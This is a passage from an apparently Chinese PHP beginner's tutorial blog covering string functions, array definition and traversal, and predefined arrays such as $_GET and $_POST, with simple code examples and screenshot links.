<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">printf(&quot;我是%s&quot;,&quot;test&quot;);    &#x2F;&#x2F;输出我是test</span><br><span class="line">$aa &#x3D; sprintf(&quot;我是%s&quot;,&quot;test&quot;);</span><br><span class="line">echo $aa;   &#x2F;&#x2F;输出我是test</span><br></pre></td></tr></table></figure>

<h2 id="常用的字符串格式化函数"><a href="#常用的字符串格式化函数" class="headerlink" title="常用的字符串格式化函数"></a>常用的字符串格式化函数</h2><h3 id="去除空格和字符串填充函数"><a href="#去除空格和字符串填充函数" class="headerlink" title="去除空格和字符串填充函数"></a>去除空格和字符串填充函数</h3><ul>
<li><code>ltrim()</code>：删去字符串前面的空格</li>
<li><code>rtrim()</code>：删去字符串后面的空格</li>
<li><code>trim()</code>：删去字符串前后的空格  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">   $info &#x3D; &quot; 我前面有个空格&quot;;</span><br><span class="line">$info1 &#x3D; &quot;我后面有个空格 &quot;;</span><br><span class="line">$info2 &#x3D; &quot; 我前后有个空格 &quot;;</span><br><span class="line">var_dump(ltrim($info));		&#x2F;&#x2F;去除字符串前面的空格</span><br><span class="line">var_dump(rtrim($info1));	&#x2F;&#x2F;去除字符串后面的空格</span><br><span class="line">var_dump(trim($info2));		&#x2F;&#x2F;去除字符串前后的空格</span><br></pre></td></tr></table></figure></li>
<li><code>str_pad()</code>：按需求对字符串进行填充<ul>
<li><code>STR_PAD_LEFT</code>：字符串左填补</li>
<li><code>STR_PAD_RIGHT</code>：字符串右填补</li>
<li><code>STR_PAD_BOTH</code>：字符串左右两端填补<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">   $input &#x3D; &quot;Alien&quot;;</span><br><span class="line">var_dump(str_pad($input, 10));&#x2F;&#x2F; 输出&quot;Alien     &quot;</span><br><span class="line">var_dump(str_pad($input, 10, &quot;-&#x3D;&quot;, STR_PAD_LEFT));&#x2F;&#x2F; 输出 &quot;-&#x3D;-&#x3D;-Alien&quot;</span><br><span class="line">var_dump(str_pad($input, 10, &quot;_&quot;, STR_PAD_BOTH));&#x2F;&#x2F; 输出 &quot;__Alien___&quot;</span><br><span class="line">var_dump(str_pad($input, 6 , &quot;___&quot;));&#x2F;&#x2F; 输出&quot;Alien_&quot;</span><br></pre></td></tr></table></figure>
<h3 id="字符串大小写的转换"><a href="#字符串大小写的转换" class="headerlink" title="字符串大小写的转换"></a>字符串大小写的转换</h3></li>
</ul>
</li>
<li><code>strtolower()</code>：将字符串全部转换为小写字符串</li>
<li><code>strtoupper()</code>：将字符串全部转换为大写字符串</li>
<li><code>ucfirst()</code>：将字符串第一个字符改大写</li>
<li><code>ucwords()</code>：将字符串每个字第一个字母改大写  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$info &#x3D; &quot;ABCDEFG HIJFLNM&quot;;</span><br><span class="line">&#x2F;&#x2F; 转换成小写</span><br><span class="line">$info &#x3D; strtolower($info);</span><br><span class="line">var_dump($info);</span><br><span class="line">&#x2F;&#x2F; 转换成大写</span><br><span class="line">var_dump(strtoupper($info));</span><br><span class="line">&#x2F;&#x2F; 把首字母变成大写</span><br><span class="line">var_dump(ucfirst($info));</span><br><span class="line">&#x2F;&#x2F; 每个字第一个字母改大写。</span><br><span class="line">var_dump(ucwords($info));</span><br></pre></td></tr></table></figure>
  <img src="https://qiniu.hzktester.top/tp2020110608.png" alt="image"><h3 id="和HTML标签相关联的字符串格式化"><a href="#和HTML标签相关联的字符串格式化" class="headerlink" title="和HTML标签相关联的字符串格式化"></a>和HTML标签相关联的字符串格式化</h3></li>
<li><code>nl2br()</code>：将字符串中<code>\n</code>转成HTML换行符<code>&lt;br/&gt;</code>  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$html &#x3D; &quot;我要换行\n&quot;;</span><br><span class="line">var_dump(nl2br($html));</span><br></pre></td></tr></table></figure>
  <img src="https://qiniu.hzktester.top/tp2020110609.png" alt="image"></li>
<li><code>htmlspecialchars()</code>：把指定特殊符号转换成实体，如&lt;&gt;  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$html &#x3D; &quot;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;我是开始&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;&quot;;</span><br><span class="line">$shilihuahtml &#x3D; htmlspecialchars($html);</span><br><span class="line">var_dump($shilihuahtml);</span><br></pre></td></tr></table></figure>
  <img src="https://qiniu.hzktester.top/tp2020110610.png" alt="image"></li>
<li><code>htmlspecialchars_decode()</code>：实体转换为<code>html</code></li>
<li><code>strip_tags()</code>：删除<code>html</code>的标签函数  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">   $html &#x3D; &quot;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;我是开始&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;&quot;;</span><br><span class="line">   var_dump(strip_tags($html));	&#x2F;&#x2F;删除全部html代码，输出string(12) &quot;我是开始&quot;</span><br><span class="line">var_dump(strip_tags($html,&quot;&lt;title&gt;&quot;));	&#x2F;&#x2F;只保留title标签,标题会显示我是开始</span><br></pre></td></tr></table></figure>
  <img src="https://qiniu.hzktester.top/tp2020110611.png" alt="image"><h3 id="其他字符串格式化函数"><a href="#其他字符串格式化函数" class="headerlink" title="其他字符串格式化函数"></a>其他字符串格式化函数</h3></li>
<li><code>strrev()</code>：颠倒字符串，将字符串前后颠倒</li>
<li><code>strlen()</code>：取得字符串长度</li>
<li><code>number_format()</code>：格式货币、数字、时间等</li>
<li><code>md5()</code>：md5加密函数  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$a &#x3D; &quot;123456&quot;;</span><br><span class="line">&#x2F;&#x2F;颠倒字符串</span><br><span class="line">var_dump(strrev($a));</span><br><span class="line">&#x2F;&#x2F; 获取字符串的长度</span><br><span class="line">var_dump(strlen($a));</span><br><span class="line">&#x2F;&#x2F;格式货币、数字、时间等。</span><br><span class="line">$number &#x3D; 1234.5678;</span><br><span class="line">var_dump(number_format($number,2,&#39;.&#39;,&#39;&#39;));</span><br><span class="line">&#x2F;&#x2F;md5加密</span><br><span class="line">var_dump(md5($a));</span><br></pre></td></tr></table></figure>
  <img src="https://qiniu.hzktester.top/tp2020110612.png" alt="image"></li>
</ul>
<h2 id="字符串比较函数"><a href="#字符串比较函数" class="headerlink" title="字符串比较函数"></a>字符串比较函数</h2><h3 id="字符串的比较"><a href="#字符串的比较" class="headerlink" title="字符串的比较"></a>字符串的比较</h3><ul>
<li><code>strcmp()</code>：字符串整个比较是否相同</li>
<li><code>strncmp()</code>：指定比较长度的字符串比较</li>
<li><code>strcasecmp()</code>：不区分大小写的字符串比较</li>
<li><code>strnatcmp()</code>：按自然排序法对字符串比较</li>
<li><code>similar_text()</code>：字符串的模糊比较，返回相似字符串的个数<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump(strcmp(&#39;ABCcc&#39;,&#39;ABccc&#39;));		&#x2F;&#x2F;int(-1)</span><br><span class="line">var_dump(strncmp(&#39;ABCcc&#39;,&#39;ABccc&#39;,6));	&#x2F;&#x2F;int(-1)</span><br><span class="line">var_dump(strcasecmp(&#39;ABCcc&#39;,&#39;ABccc&#39;));	&#x2F;&#x2F;int(0)</span><br><span class="line">var_dump(strnatcmp(&#39;ABCcc&#39;,&#39;ABccc&#39;));	&#x2F;&#x2F;int(-1)</span><br><span class="line">var_dump(similar_text(&#39;ABCcc&#39;,&#39;ABCcc&#39;));&#x2F;&#x2F;int(5)</span><br></pre></td></tr></table></figure>
<h3 id="字符串的分割与拼装"><a href="#字符串的分割与拼装" class="headerlink" title="字符串的分割与拼装"></a>字符串的分割与拼装</h3></li>
<li><code>explode()</code>：使用一个字符串分割另一个字符串，返回一个数组  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">   $pizza &#x3D; &quot;piece1 piece2 piece3&quot;;</span><br><span class="line">$pieces &#x3D; explode(&quot; &quot;, $pizza); &#x2F;&#x2F;用空格分隔pizza变量组成数组赋值给pieces</span><br><span class="line">echo $pieces[0]; 	&#x2F;&#x2F; piece1</span><br><span class="line">echo $pieces[1]; 	&#x2F;&#x2F; piece2</span><br><span class="line">   echo $pieces[2];    &#x2F;&#x2F; piece3</span><br></pre></td></tr></table></figure></li>
<li><code>implode()</code>：用一组较小的字符串创建一个大字符串  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$array &#x3D; array(&#39;lastname&#39;,&#39;email&#39;,&#39;phone&#39;);</span><br><span class="line">$comma_separated &#x3D; implode(&quot;,&quot;,$array); &#x2F;&#x2F;使用,分割array的每个值组成一个字符串</span><br><span class="line">echo $comma_separated; &#x2F;&#x2F;输出lastname,email,phone</span><br></pre></td></tr></table></figure>
<h3 id="字符串的截取、查找、替换"><a href="#字符串的截取、查找、替换" class="headerlink" title="字符串的截取、查找、替换"></a>字符串的截取、查找、替换</h3><h4 id="截取"><a href="#截取" class="headerlink" title="截取"></a>截取</h4></li>
<li><code>substr()</code>：取部分字符串，返回一个新的字符串</li>
<li><code>strstr()</code>：截取字符串某个参数第一次出现到结尾的字符串</li>
<li><code>strrchr()</code>：截取字符串某个参数最后一次出现到结尾的字符串</li>
</ul>
<h4 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h4><ul>
<li><code>strpos()</code>：寻找字符串某个参数最先出现的位置</li>
<li><code>strrpos()</code>：寻找字符串某个参数最后出现的位置</li>
</ul>
<h4 id="替换"><a href="#替换" class="headerlink" title="替换"></a>替换</h4><ul>
<li><code>str_replace()</code>：替换字符串</li>
</ul>
<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$info &#x3D; &quot;ABCDEFG HIJFLNM&quot;;</span><br><span class="line">&#x2F;&#x2F;截取</span><br><span class="line">var_dump(substr($info,4,7));	&#x2F;&#x2F;从字符串第4位开始，截取7位</span><br><span class="line">var_dump(strstr($info,&#39;F&#39;));	&#x2F;&#x2F;截取字符串第一个F开始到结尾的字符串</span><br><span class="line">var_dump(strrchr($info,&#39;F&#39;));	&#x2F;&#x2F;截取字符串最后一个F开始到结尾的字符串</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;查找</span><br><span class="line">var_dump(strpos($info,&#39;F&#39;));	&#x2F;&#x2F;寻找字符串F最先出现的位置，返回下标，默认从0开始</span><br><span class="line">var_dump(strrpos($info,&#39;F&#39;));	&#x2F;&#x2F;寻找字符串F最后一次出现的位置，返回下标，默认从0开始</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;替换</span><br><span class="line">var_dump($info);</span><br><span class="line">var_dump(str_replace([&quot;A&quot;,&quot;B&quot;], [&quot;2&quot;,&quot;4&quot;], $info));	&#x2F;&#x2F;把字符串A和B分别替换为2和4</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020110613.png" alt="image"></p>
]]></content>
      <categories>
        <category>PHP基础</category>
      </categories>
      <tags>
        <tag>PHP基础</tag>
      </tags>
  </entry>
  <entry>
    <title>数组的定义，遍历，预定义数组、数组相关处理函数</title>
    <url>/posts/50045358.html</url>
    <content><![CDATA[<h2 id="数组的概述"><a href="#数组的概述" class="headerlink" title="数组的概述"></a>数组的概述</h2><p><code>PHP</code>中的数组实际上是一个有序图。图是一种把 <code>values</code> 映射到 <code>keys</code> 的类型。此类型在很多方面做了优化，因此可以把它当成真正的数组来使用，或列表（矢量），散列表（是图的一种实现），字典，集合，队列以及更多可能性。因为可以用另一个 <code>PHP</code> 数组作为值，也可以很容易地模拟树。</p>
<ul>
<li><strong>数组下标</strong>：可以视为资料内容在此数组中的识别名称，通常被称为数组下标。</li>
<li>当<strong>索引值为数值</strong>时，也代表此资料内容在数组中的储存位置。</li>
<li>数组中有几个索引值就被称为几维数组。</li>
<li>数据分类：在PHP中有两种数组，<strong>索引数组</strong>和<strong>关联数组</strong>。<ul>
<li><strong>索引（indexed）数组</strong>的索引值是整数，以0开始。当通过位置来标识东西时用索引数组。</li>
<li><strong>关联（associative）数组</strong>以字符串做为索引值，关联数组更像操作表。索引值为列名，用于访问列的数据。</li>
</ul>
</li>
</ul>
<h2 id="数组的定义"><a href="#数组的定义" class="headerlink" title="数组的定义"></a>数组的定义</h2><p>由于 <code>PHP</code> 是属于弱类型数据，因此源代码中的数组并不需要经过特别的声明操作，直接将一组数值指定给某一数组元素即可。一般情况下数组的赋值有三种方式：</p>
<ul>
<li>直接赋值方式如：  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$a[0]&#x3D;&#39;spam@126.com&#39;;  </span><br><span class="line">$a[1]&#x3D;&#39;abuse@sohu.com&#39;;</span><br></pre></td></tr></table></figure></li>
<li>使用<code>array</code>函数如：  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$a&#x3D;array(&quot;spam@126.com&quot;,&quot;abuse@sohu.com&quot;);</span><br></pre></td></tr></table></figure></li>
<li>使用<code>[]</code>如：  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$a&#x3D;[&quot;spam@126.com&quot;,&quot;abuse@sohu.com&quot;];</span><br></pre></td></tr></table></figure>
<h3 id="直接赋值的方式声明数组"><a href="#直接赋值的方式声明数组" class="headerlink" title="直接赋值的方式声明数组"></a>直接赋值的方式声明数组</h3>基本格式：<code>$数组变量名[索引值]=资料内容</code></li>
</ul>
<p>其中<strong>索引值（下标）可以是一个字符串或一个整数</strong>。等价于整数（不以0开头）的字符串值被当作整数对待。因此，数组<code>$array[3]</code>与<code>$array[&#39;3&#39;]</code>是引用相同的元素。但是<code>$array[&#39;03&#39;]</code>引用的另外不同的元素。</p>
<h4 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h4><p>分别定义两个数组<code>$a</code>和<code>$b</code>，看看区别：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$a[0]&#x3D;1;</span><br><span class="line">	$a[1]&#x3D;2;</span><br><span class="line">	$a[2]&#x3D;3;</span><br><span class="line"></span><br><span class="line">	$b[]&#x3D;1;     &#x2F;&#x2F;不定义下标默认从0开始</span><br><span class="line">	$b[]&#x3D;2;</span><br><span class="line">	$b[]&#x3D;3;</span><br><span class="line">	$b[6]&#x3D;4;    &#x2F;&#x2F;定义下标为6的值</span><br><span class="line">	$b[]&#x3D;5;     &#x2F;&#x2F;后面的顺延下标为7</span><br><span class="line"></span><br><span class="line">	var_dump($a);</span><br><span class="line">	echo &quot;&lt;br&gt;---------------&lt;br&gt;&quot;;</span><br><span class="line">	var_dump($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>页面显示结果：</p>
<p><img src="https://qiniu.hzktester.top/tp2020102201.png" alt="image"></p>
<h4 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h4><p>下标定义为字符串的使用：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$a[&quot;name&quot;]&#x3D;&quot;zhang&quot;;</span><br><span class="line">	$a[&quot;sex&quot;]&#x3D;&quot;man&quot;;</span><br><span class="line">	$a[&quot;age&quot;]&#x3D;23;</span><br><span class="line"></span><br><span class="line">	$b[&quot;name&quot;]&#x3D;&quot;lisi&quot;;</span><br><span class="line">	$b[]&#x3D;&quot;woman&quot;;       &#x2F;&#x2F;不定义下标默认为0</span><br><span class="line">	$b[&quot;age&quot;]&#x3D;28;</span><br><span class="line">	$b[8]&#x3D;4;            &#x2F;&#x2F;定义下标为8的值</span><br><span class="line">	$b[]&#x3D;5;             &#x2F;&#x2F;后面的顺延下标为9</span><br><span class="line"></span><br><span class="line">	var_dump($a);</span><br><span class="line">	echo &quot;&lt;br&gt;---------------&lt;br&gt;&quot;;</span><br><span class="line">	var_dump($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>页面显示结果：</p>
<p><img src="https://qiniu.hzktester.top/tp2020102201.png" alt="image"></p>
<h3 id="使用array-结构新建数组"><a href="#使用array-结构新建数组" class="headerlink" title="使用array()结构新建数组"></a>使用array()结构新建数组</h3><ul>
<li>基本格式：  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">array([key&#x3D;&gt;]value,...) </span><br><span class="line">&#x2F;&#x2F;key可以是数字或字符串</span><br><span class="line">&#x2F;&#x2F;value可以是任意值</span><br></pre></td></tr></table></figure></li>
<li>如果键名是一个<code>int</code>类型的标准表达方法，则被解释为整数（例如 8 将被解释为 8，而 “08” 将被解释为 “08”）。<code>key</code>中的浮点数被取整为 <code>int</code>。<code>PHP</code> 中没有不同的数字下标和关联下标数组，数组的类型只有一种，它可以同时包含整型和字符串型的下标。 </li>
<li>如果对给出的值没有指定键名，则取当前最大的整数索引值，而新的键名将是该值加一。如果指定的键名已经有了值，则该值会被覆盖。 </li>
</ul>
<h4 id="示例1：-1"><a href="#示例1：-1" class="headerlink" title="示例1："></a>示例1：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$a&#x3D;array(1,2,3,4,5,6);</span><br><span class="line">	$b&#x3D;array(&quot;one&quot;, &quot;two&quot;, &quot;three&quot;);</span><br><span class="line">	$c&#x3D;array(0&#x3D;&gt;&quot;aaa&quot;,1&#x3D;&gt;&quot;bbb&quot;,2&#x3D;&gt;&quot;ccc&quot;);</span><br><span class="line">	$d&#x3D;array(&quot;aaa&quot;,6&#x3D;&gt;&quot;bbb&quot;,&quot;ccc&quot;);</span><br><span class="line">	$e&#x3D;array(&quot;name&quot;&#x3D;&gt;&quot;zhang&quot;, &quot;age&quot;&#x3D;&gt;20);</span><br><span class="line"></span><br><span class="line">	var_dump($a);</span><br><span class="line">	echo &quot;&lt;br&gt;---------------&lt;br&gt;&quot;;</span><br><span class="line">	var_dump($b);</span><br><span class="line">	echo &quot;&lt;br&gt;---------------&lt;br&gt;&quot;;</span><br><span class="line">	var_dump($c);</span><br><span class="line">	echo &quot;&lt;br&gt;---------------&lt;br&gt;&quot;;</span><br><span class="line">	var_dump($d);</span><br><span class="line">	echo &quot;&lt;br&gt;---------------&lt;br&gt;&quot;;</span><br><span class="line">	var_dump($e);</span><br><span class="line">	echo &quot;&lt;br&gt;---------------&lt;br&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>页面显示结果：</p>
<p><img src="https://qiniu.hzktester.top/tp2020102203.png" alt="image"></p>
<h3 id="使用-定义数组"><a href="#使用-定义数组" class="headerlink" title="使用[] 定义数组"></a>使用[] 定义数组</h3><h4 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$a &#x3D; [10,20,30,40,50];</span><br><span class="line">$b &#x3D; [0&#x3D;&gt;10,1&#x3D;&gt;20,2&#x3D;&gt;30];</span><br><span class="line">$c &#x3D; [&quot;name&quot;&#x3D;&gt;&quot;zhangsan&quot;,&quot;age&quot;&#x3D;&gt;20];</span><br></pre></td></tr></table></figure>
<h3 id="多维数组的声明"><a href="#多维数组的声明" class="headerlink" title="多维数组的声明"></a>多维数组的声明</h3><p>多维数组的声明方式及规则，与一维数组相同，例如:下面二维数组的声明片段：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;php </span><br><span class="line">    $a &#x3D; [&#39;1&#39;,&#39;2&#39;,[&#39;1&#39;,&#39;2&#39;,&#39;3&#39;]];</span><br><span class="line">	var_dump($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>页面显示结果：</p>
<p><img src="https://qiniu.hzktester.top/tp2020102204.png" alt="image"></p>
<h2 id="数组的遍历"><a href="#数组的遍历" class="headerlink" title="数组的遍历"></a>数组的遍历</h2><h3 id="使用for语句遍历数组"><a href="#使用for语句遍历数组" class="headerlink" title="使用for语句遍历数组"></a>使用for语句遍历数组</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    &#x2F;&#x2F;下标     0  1   for      2  3  4  5 6 10        11    12</span><br><span class="line">  	$arr&#x3D;array(1, 3, &quot;for&quot;&#x3D;&gt;4, 5, 6, 7, 8,9,10&#x3D;&gt;&quot;aa&quot;,&quot;bb&quot;, &quot;cc&quot;);</span><br><span class="line">		</span><br><span class="line">	for($i&#x3D;0; $i&lt;count($arr); $i++)&#123;        &#x2F;&#x2F;使用count得到数组的总数遍历</span><br><span class="line">		echo &quot;\$arr[&quot;.$i.&quot;]&#x3D;&quot;.$arr[$i].&quot;&lt;br&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020102205.png" alt="image"></p>
<p>下标为7，8，9的不存在所以报错</p>
<h3 id="使用foreach语句遍历数组"><a href="#使用foreach语句遍历数组" class="headerlink" title="使用foreach语句遍历数组"></a>使用foreach语句遍历数组</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  	$arr&#x3D;array(1, 3, &quot;for&quot;&#x3D;&gt;4, 5, 6, 7, 8,9,10&#x3D;&gt;&quot;aa&quot;,&quot;bb&quot;, &quot;cc&quot;);</span><br><span class="line">		</span><br><span class="line">	foreach ($arr as $k &#x3D;&gt; $v) &#123;</span><br><span class="line">		echo &quot;\$arr[&quot;.$k.&quot;]&#x3D;&quot;.$v.&quot;&lt;br&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020102206.png" alt="image"></p>
<p>使用<code>foreach</code>循环不会报错</p>
<h3 id="联合使用list-、each-和while循环遍历数组"><a href="#联合使用list-、each-和while循环遍历数组" class="headerlink" title="联合使用list()、each()和while循环遍历数组"></a>联合使用list()、each()和while循环遍历数组</h3><p>两种写法：</p>
<h4 id="写法1："><a href="#写法1：" class="headerlink" title="写法1："></a>写法1：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $fruit&#x3D; array(&#39;a&#39; &#x3D;&gt; &#39;apple&#39;, &#39;b&#39; &#x3D;&gt; &#39;banana&#39;, &#39;c&#39; &#x3D;&gt; &#39;cranberry&#39;);</span><br><span class="line">	while (list($key, $val) &#x3D; each($fruit)) &#123;</span><br><span class="line">		echo &quot;$key &#x3D;&gt; $val\n&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="写法2："><a href="#写法2：" class="headerlink" title="写法2："></a>写法2：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $arr&#x3D;array(&quot;one&quot;&#x3D;&gt;&quot;aaa&quot;, &quot;two&quot;&#x3D;&gt;&quot;bbb&quot;, &quot;three&quot;&#x3D;&gt;&quot;cccc&quot;);</span><br><span class="line">    while($sz&#x3D;each($arr))&#123;</span><br><span class="line">	&#x2F;&#x2F;echo $sz[0].&quot;&#x3D;&#x3D;&#x3D;&gt;&quot;.$sz[1].&quot;&lt;br&gt;&quot;;</span><br><span class="line">	echo $sz[&quot;key&quot;].&quot;&#x3D;&#x3D;&#x3D;&gt;&quot;.$sz[&quot;value&quot;].&quot;&lt;br&gt;&quot;;	</span><br><span class="line">  &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020102207.png" alt="image"></p>
<h3 id="使用数组内部指针控制函数遍历数组"><a href="#使用数组内部指针控制函数遍历数组" class="headerlink" title="使用数组内部指针控制函数遍历数组"></a>使用数组内部指针控制函数遍历数组</h3><p>定义一个数组如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$info &#x3D; [1,2,3,4,5,6,7,8,9];</span><br></pre></td></tr></table></figure>
<ul>
<li><code>next()</code>：将指针向后移动一位<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump(next($info));</span><br><span class="line">&#x2F;&#x2F;输出int(2)</span><br></pre></td></tr></table></figure></li>
<li><code>prev()</code>：将指针向前移动一位<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump(prev($info));</span><br><span class="line">&#x2F;&#x2F;指针向前移动一位是-1，所以输出bool(false)</span><br></pre></td></tr></table></figure></li>
<li><code>end()</code>：将指针指向数组中最后一个元素<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump(end($info));</span><br><span class="line">&#x2F;&#x2F;输出最后一个元素，int(9)</span><br></pre></td></tr></table></figure></li>
<li><code>reset()</code>：将指针指向数组中第一个元素<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump(reset($info));</span><br><span class="line">&#x2F;&#x2F;输出第一个元素，int(1)</span><br></pre></td></tr></table></figure></li>
<li><code>current()</code>：不会移动数组内部指针<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump(current($info));</span><br><span class="line">&#x2F;&#x2F;输出默认指针值，也就是第一位。int(1)</span><br></pre></td></tr></table></figure></li>
<li><code>key()</code>：返回数组内部指针当前指向元素的键名<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump(key($info));</span><br><span class="line">&#x2F;&#x2F;输出键名，int(0)</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;如果数组改为</span><br><span class="line">$info &#x3D; [&#39;aa&#39;&#x3D;&gt;1,2,3,4,5,6,7,8,9];</span><br><span class="line">var_dump(key($info));</span><br><span class="line">&#x2F;&#x2F;输出键名，string(2) &quot;aa&quot;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="预定义数组"><a href="#预定义数组" class="headerlink" title="预定义数组"></a>预定义数组</h2><h3 id="服务器变量：-SERVER"><a href="#服务器变量：-SERVER" class="headerlink" title="服务器变量：$_SERVER"></a>服务器变量：$_SERVER</h3><p><code>$_SERVER</code>是一个包含诸如头信息<code>header</code>、路径<code>path</code>和脚本位置<code>script locations</code>等一系列服务器变量的数组。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump($_SERVER);</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020110601.png" alt="image"></p>
<h3 id="环境变量：-ENV"><a href="#环境变量：-ENV" class="headerlink" title="环境变量：$_ENV"></a>环境变量：$_ENV</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump($_ENV);</span><br><span class="line">&#x2F;&#x2F;没有环境变量，输出</span><br><span class="line">&#x2F;&#x2F;array(0) &#123;</span><br><span class="line">&#x2F;&#x2F;&#125;</span><br></pre></td></tr></table></figure>
<h3 id="HTTP-GET变量：-GET"><a href="#HTTP-GET变量：-GET" class="headerlink" title="HTTP GET变量：$_GET"></a>HTTP GET变量：$_GET</h3><p>获取到<code>GET</code>请求内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump($_GET);</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020110602.png" alt="image"></p>
<h3 id="HTTP-POST变量：-POST"><a href="#HTTP-POST变量：-POST" class="headerlink" title="HTTP POST变量：$_POST"></a>HTTP POST变量：$_POST</h3><p>获取到<code>POST</code>请求内容</p>
<p>同目录下创建一个<code>test.php</code>文件，以<code>POST</code>请求提交一个id参数到<code>index.php</code>文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Type:text&#x2F;html;charset&#x3D;utf-8&quot;);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">	&lt;title&gt;Document&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;form action&#x3D;&quot;.&#x2F;index.php&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">		&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;name&quot; id&#x3D;&quot;&quot;&gt;</span><br><span class="line">		&lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot;&gt;	</span><br><span class="line">	&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
<p><code>index.php</code>文件中输出<code>POST</code>请求内容:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump($_POST);</span><br></pre></td></tr></table></figure>
<p>访问<code>test.php</code>提交一个参数：</p>
<p><img src="https://qiniu.hzktester.top/tp2020110603.png" alt="image"></p>
<p><img src="https://qiniu.hzktester.top/tp2020110604.png" alt="image"></p>
<h3 id="REQUEST变量：-REQUEST"><a href="#REQUEST变量：-REQUEST" class="headerlink" title="REQUEST变量：$_REQUEST"></a>REQUEST变量：$_REQUEST</h3><p>获取到所有请求头<code>GET,POST,COOKIE</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump($_REQUEST);</span><br></pre></td></tr></table></figure>
<h3 id="HTTP文件上传变量：-FILES"><a href="#HTTP文件上传变量：-FILES" class="headerlink" title="HTTP文件上传变量：$_FILES"></a>HTTP文件上传变量：$_FILES</h3><p>获取文件上传变量</p>
